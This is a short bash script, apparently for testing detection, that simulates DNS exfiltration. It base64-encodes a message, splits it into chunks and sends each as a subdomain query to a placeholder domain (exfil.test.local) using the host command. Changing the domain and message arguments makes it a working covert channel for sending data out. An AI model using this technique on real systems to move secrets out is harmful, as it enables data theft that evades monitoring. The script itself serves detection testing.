#!/bin/bash
DOMAIN=${1:-exfil.test.local}
MSG=${2:-"TEST-EXFIL"}
for chunk in $(echo -n "$MSG" | base64 | fold -w 30); do
  host "${chunk}.${DOMAIN}" >/dev/null 2>&1 || true
  sleep 0.2
done
echo "simulate_dns_exfil: done"
